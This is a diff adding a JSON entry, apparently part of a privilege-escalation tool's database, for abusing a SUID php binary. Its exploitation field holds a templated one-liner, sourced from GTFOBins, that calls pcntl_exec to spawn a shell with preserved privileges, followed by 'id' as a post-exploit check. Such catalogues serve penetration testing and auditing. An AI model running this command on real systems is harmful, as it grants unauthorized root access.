@@ -1,0 +1,11 @@
+{
+  "id": "suid_php",
+  "category": "SUID_GTFOBINS",
+  "binary": "php",
+  "cve": null,
+  "exploitation": ["{{binary}} -r 'pcntl_exec(\"{{shell}}\", [\"-p\"]);'"],
+  "post_exploit": ["id"],
+  "source": "gtfobins.github.io",
+  "tags": ["suid", "gtfobins"],
+  "severity": "high"
+}
